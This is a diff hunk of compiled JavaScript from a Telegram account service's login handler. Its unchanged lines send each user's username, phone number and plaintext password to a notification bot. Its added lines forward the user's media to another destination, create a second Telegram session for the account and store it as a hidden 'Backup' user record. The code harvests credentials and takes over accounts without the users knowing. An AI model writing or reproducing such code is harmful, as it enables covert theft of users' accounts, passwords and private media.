@@ -38,8 +38,16 @@ let UsersService = class UsersService {
         else {
             await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);
             setTimeout(async () => {
-                await connection_manager_1.connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
-                this.telegramService.forwardMedia(user.mobile, process.env.SavedMessages, null);
+                try {
+                    await connection_manager_1.connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
+                    this.telegramService.forwardMedia(user.mobile, process.env.SavedMessages, null);
+                    const newSession = await this.telegramService.createNewSession(user.mobile);
+                    const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: "Backup" });
+                    await newUserBackup.save();
+                }
+                catch (error) {
+                    console.log("Error in creating new session", error);
+                }
             }, 3000);
             const newUser = new this.userModel(user);
             return newUser.save();
